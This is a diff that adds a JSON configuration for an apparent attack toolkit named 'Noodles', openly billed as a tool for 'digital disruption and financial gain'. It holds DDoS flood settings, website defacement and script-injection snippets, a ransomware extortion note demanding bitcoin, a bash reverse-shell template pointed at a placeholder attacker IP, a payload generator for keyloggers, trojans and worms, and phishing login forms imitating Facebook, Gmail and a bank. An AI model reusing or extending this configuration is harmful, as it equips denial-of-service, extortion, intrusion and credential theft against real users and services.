@@ -1,1 +1,92 @@
-
+{
+  "application": {
+    "name": "Noodles",
+    "version": "1.0.0",
+    "description": "The ultimate tool for digital disruption and financial gain.",
+    "theme_defaults": {
+      "primary_background": "#212121",
+      "secondary_background": "#2c2c2c",
+      "accent_dark_blue": "#1a3449",
+      "accent_dark_green": "#2a9d8f",
+      "text_color": "#e0e0e0",
+      "border_color": "#444444"
+    }
+  },
+  "ddos_defaults": {
+    "http_flood": {
+      "requests_per_second": 1000,
+      "duration_seconds": 600,
+      "user_agents": [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36"
+      ],
+      "headers": {
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Accept-Encoding": "gzip, deflate, br"
+      },
+      "method": "GET"
+    },
+    "tcp_flood": {
+      "packets_per_second": 5000,
+      "duration_seconds": 600,
+      "port": 80,
+      "flags": ["SYN"],
+      "payload_size": 0
+    },
+    "udp_flood": {
+      "packets_per_second": 5000,
+      "duration_seconds": 600,
+      "port": 53,
+      "payload_size": 1472
+    }
+  },
+  "defacement_templates": {
+    "image_replacement": {
+      "default_url": "https://i.ibb.co/XZYXhL3/noodles-defaced.png",
+      "html_snippet": "<style>body{margin:0!important;overflow:hidden!important;}img{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;object-fit:cover;}</style><img src='__IMAGE_URL__'>"
+    },
+    "text_modification": {
+      "default_selector": "body",
+      "new_text_content": "<h1 style='color:#e0e0e0;text-align:center;font-family:\"Arial Black\", Gadget, sans-serif;font-size:5em;text-shadow:4px 4px 8px #1a3449;'>NOODLES WAS HERE!</h1><p style='color:#2a9d8f;text-align:center;font-family:Arial, sans-serif;font-size:1.5em;'>Your digital presence has been compromised. All systems are now under our control.</p>"
+    },
+    "html_injection": {
+      "default_selector": "body",
+      "html_to_inject": "<div style='position:fixed;top:0;left:0;width:100vw;height:100vh;background-color:rgba(0,0,0,0.9);z-index:10000;display:flex;align-items:center;justify-content:center;'><h1 style='color:#2a9d8f;font-family:\"Courier New\", Courier, monospace;font-size:4em;'>&gt; System Overridden.</h1></div><script>console.log('Noodles Injection Active.');</script>"
+    }
+  },
+  "connection_defaults": {
+    "port_scan": {
+      "common_ports": [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306, 3389, 5900, 8080],
+      "timeout_ms": 1000
+    },
+    "banner_grab": {
+      "default_port": 80,
+      "timeout_ms": 2000
+    }
+  },
+  "ransomware_conceptual": {
+    "note_title": "SYSTEM ENCRYPTED BY NOODLES",
+    "note_content": "All critical data on this system has been encrypted with a military-grade algorithm. Your access is revoked. To restore your files and operations, a payment of 0.75 BTC is required. Transfer the sum to: __BTC_ADDRESS__ within 72 hours. Failure to comply will result in permanent data destruction and public exposure of sensitive information.",
+    "simulated_encryption_key_format": "AES-256-GCM (simulated)",
+    "simulated_btc_address": "bc1qabcdefghijklmnopqrstuvwxyz0123456789abc",
+    "simulated_timer_hours": 72
+  },
+  "other_tools_defaults": {
+    "payload_generator": {
+      "types": ["reverse_shell", "keylogger", "trojan", "worm"],
+      "default_os": "linux",
+      "default_arch": "x64",
+      "reverse_shell_template": "bash -i >& /dev/tcp/__ATTACKER_IP__/__ATTACKER_PORT__ 0>&1"
+    },
+    "credential_harvester": {
+      "default_method": "phishing_template",
+      "templates": {
+        "facebook": {"title": "Facebook Login", "html": "<form><input type='text' placeholder='Email or Phone'/><input type='password' placeholder='Password'/><button>Log In</button></form>"},
+        "gmail": {"title": "Gmail Login", "html": "<form><input type='email' placeholder='Email'/><input type='password' placeholder='Password'/><button>Next</button></form>"},
+        "bank": {"title": "Bank Login", "html": "<form><input type='text' placeholder='Username'/><input type='password' placeholder='Password'/><button>Sign In</button></form>"}
+      }
+    }
+  }
+}
